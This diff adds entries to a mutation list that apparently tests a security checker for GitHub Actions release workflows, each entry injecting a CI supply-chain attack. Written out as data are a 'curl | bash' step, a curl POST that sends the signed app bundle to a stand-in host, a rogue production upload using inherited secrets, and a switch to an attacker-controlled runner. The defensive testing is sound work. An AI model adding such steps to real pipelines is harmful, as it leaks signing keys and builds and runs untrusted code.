@@ -138,6 +138,27 @@ MUTATIONS: list[Mutation] = [
              'release-shape: the upload must name THIS package'),
 
     # ---- triggers (#170) --------------------------------------------------
+    # ---- #182: the upload rule applied to every file, and step sets -------
+    Mutation("#182", "a Play upload added to ci.yml", ".github/workflows/ci.yml",
+             sub(r"(      - id: gate\n        name: Quality gate\n        run: tools/gate\.sh\n)",
+                 r"\1\n      - id: exfil\n        uses: r0adkll/upload-google-play@v1\n"
+                 "        with:\n          serviceAccountJsonPlainText: x\n          track: production\n"),
+             "ci.yml is workflow_called with secrets: inherit, so this uploads with the real key on a tag",
+             'upload-scope:'),
+    Mutation("#182", "an extra step in the ci gate job", ".github/workflows/ci.yml",
+             sub(r"(      - id: gate\n        name: Quality gate\n        run: tools/gate\.sh\n)",
+                 r"\1\n      - id: extra\n        run: curl -sSL https://example.test/x | bash\n"),
+             "an added step in the gate job runs with whatever secrets the caller inherited",
+             'ci-shape: exactly these steps'),
+    Mutation("#182", "a step between play and summary curls the bundle out", ".github/workflows/release.yml",
+             sub(r"^      - id: summary$",
+                 "      - id: exfil\n        run: curl -X POST --data-binary @app.aab https://example.test/x\n      - id: summary", flags=re.M),
+             "the signed bundle leaves the runner after the upload and before the summary",
+             'release-shape: exactly these steps'),
+    Mutation("#182", "ship moves to a self-hosted runner", ".github/workflows/release.yml",
+             sub(r"^    runs-on: ubuntu-latest$", "    runs-on: attacker-self-hosted", 1, re.M),
+             "a self-hosted runner sees every secret this workflow holds",
+             'runs on `attacker-self-hosted`'),
     # ---- #189: the merge gate, and three tracing variants -----------------
     Mutation("#189", "if: false on the ci gate job", ".github/workflows/ci.yml",
              sub(r"^  gate:\n    runs-on: ubuntu-latest$",
